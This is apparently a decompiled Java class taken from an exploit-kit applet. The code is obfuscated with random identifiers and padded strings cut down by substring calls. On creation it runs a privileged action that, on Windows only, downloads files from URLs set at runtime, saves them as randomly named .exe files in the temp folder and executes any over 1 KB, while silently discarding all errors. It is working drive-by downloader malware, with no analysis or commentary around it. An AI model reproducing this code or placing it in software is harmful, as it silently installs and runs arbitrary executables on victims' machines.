// 
// Decompiled by Procyon v0.5.30
// 

package myf.y;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class lmynuvyudsrqgbqtnkakur implements PrivilegedExceptionAction
{
    public static String data;
    String xchoywytsntpmmvic;
    String tnnpvpkupgcmrexccrtsnjxrangbd;
    public static String cc;
    String ktzltlmvezmguptqearnmmc;
    String srieqpqmxejlbfwmfwzo;
    String ekmjgblujqditynpcibsrqsfegzfuy;
    String uczsbifrhjmjbydhlhakb;
    String frphttdtoyrox;
    
    public static byte[] plabnkvfal(final String s) {
        final byte[] array = new byte[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return array;
    }
    
    public void dwsqsuzizlgcjxruxubtaeov(final String s) {
    }
    
    public void ptvxqkymmzwdbdievxol(final String s) {
    }
    
    public Object run() throws Exception {
        if (lmynuvyudsrqgbqtnkakur.data == null) {
            return null;
        }
        try {
            if (System.getProperty("os.namequvwlhiyqtdqihawdsjecfalxnie".substring(0, 7)).indexOf("Windowsvdjrwtlkwbkgnjsjcoijg".substring(0, 7)) >= 0) {
                int int1 = 1;
                if (lmynuvyudsrqgbqtnkakur.cc != null) {
                    int1 = Integer.parseInt(lmynuvyudsrqgbqtnkakur.cc);
                }
                for (int i = 0; i < int1; ++i) {
                    final URL url = new URL(lmynuvyudsrqgbqtnkakur.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("java.io.tmpdirsgfkvstgeubjscvaxshdtgfaqvtmqy".substring(0, 14)) + File.separator + Math.random() + ".exeycucecxwpbkdzzxrrhlqpyq".substring(0, 4);
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n >= 1024) {
                        Runtime.getRuntime().exec(string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public lmynuvyudsrqgbqtnkakur() {
        this.xchoywytsntpmmvic = "srywowvsypctzbqyfatvurhigu";
        this.tnnpvpkupgcmrexccrtsnjxrangbd = "cgbnihhjgozmtcsrcjpdgieolkp";
        this.ktzltlmvezmguptqearnmmc = "fqjaothcbofnufbgknbuypdaag";
        this.srieqpqmxejlbfwmfwzo = "xbelmxhfjykiuyklkhvpmvqltwhakg";
        this.ekmjgblujqditynpcibsrqsfegzfuy = "ihcqqwomsfrusphndsteetwrim";
        this.uczsbifrhjmjbydhlhakb = "ndzrlnwqdzsgk";
        this.frphttdtoyrox = "djmrzfmkgtrqi";
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        lmynuvyudsrqgbqtnkakur.data = null;
        lmynuvyudsrqgbqtnkakur.cc = null;
    }
}
